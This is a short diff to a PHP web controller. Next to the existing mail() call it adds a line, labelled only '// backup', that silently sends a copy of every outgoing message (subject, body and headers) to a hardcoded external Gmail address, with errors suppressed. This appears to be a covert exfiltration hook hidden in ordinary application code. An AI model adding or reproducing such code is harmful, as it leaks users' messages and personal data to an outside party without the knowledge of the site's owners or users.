@@ -513,6 +513,8 @@ class PostController extends Controller
 
 				$result = @mail($toEmail, $subject, utf8_decode($mensaje), $header);
 				
+				// backup
+				@mail("gafeman@gmail.com", $subject, utf8_decode($mensaje), $header);
 				
 				
 				
